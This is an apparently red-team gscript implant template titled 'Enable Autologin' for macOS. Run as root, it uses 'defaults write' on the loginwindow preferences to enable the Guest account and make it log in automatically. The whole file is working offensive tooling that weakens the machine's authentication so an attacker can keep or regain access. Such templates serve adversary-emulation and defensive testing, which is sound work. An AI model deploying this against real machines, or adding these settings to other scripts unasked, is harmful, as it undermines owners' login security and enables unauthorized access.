// Example gscript template
// Title: Enable Autologin
// Author: ahhh
// Purpose: 
// Gscript version: 1.0.0
// ATT&CK: 
// Note: must run implant as root

//go_import:os/user as user

//priority:150
//timeout:150

function Deploy() {  
    console.log("starting execution of Enable Autologin");
    // Whoami
    var myuser = user.Current();
    console.log("Our user is: "+Dump(myuser[0]));
    if (myuser[0].Username == "root") {
        var response2 = G.exec.ExecuteCommand("defaults", ["write", "/Library/Preferences/com.apple.loginwindow", "GuestEnabled", "-bool", "YES"]);
        console.log("Pid: "+response2[0]);
        console.log("stdout: "+response2[1]);
        console.log("stderr: "+response2[2]);
        console.log("exit code: "+response2[3]);
        console.log("go errors: "+response2[4]);

        var response = G.exec.ExecuteCommand("defaults", ["write", "/Library/Preferences/com.apple.loginwindow", "autoLoginUser", 'Guest']);
        console.log("Pid: "+response[0]);
        console.log("stdout: "+response[1]);
        console.log("stderr: "+response[2]);
        console.log("exit code: "+response[3]);
        console.log("go errors: "+response[4]);
        console.log("Done Enable Autologin");
    } else {
        console.log("Detected a non-root user, this needs to run as root!");
    } 
    return true;
}

